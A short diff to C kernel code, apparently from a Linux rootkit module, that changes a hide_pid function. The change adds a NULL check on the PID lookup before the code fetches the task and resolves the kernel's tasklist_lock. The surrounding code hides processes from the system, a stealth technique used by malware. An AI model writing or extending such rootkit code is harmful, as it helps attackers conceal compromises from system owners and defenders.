@@ -77,7 +77,15 @@ hide_pid(pid_t pid)
 
     add_pid_to_list(hidden_pids_tail, pid);
 
-    struct task_struct *ts = pid_task(find_vpid(pid), PIDTYPE_PID);
+	struct pid* pid_struct;
+    pid_struct = find_get_pid(pid);
+
+	if(pid_struct == NULL)
+		return;
+
+    struct task_struct *ts;
+	ts = pid_task(pid_struct, PIDTYPE_PID);
+
     rwlock_t *rwlock = (rwlock_t *)kallsyms_lookup_name("tasklist_lock");
 
     if (!ts)
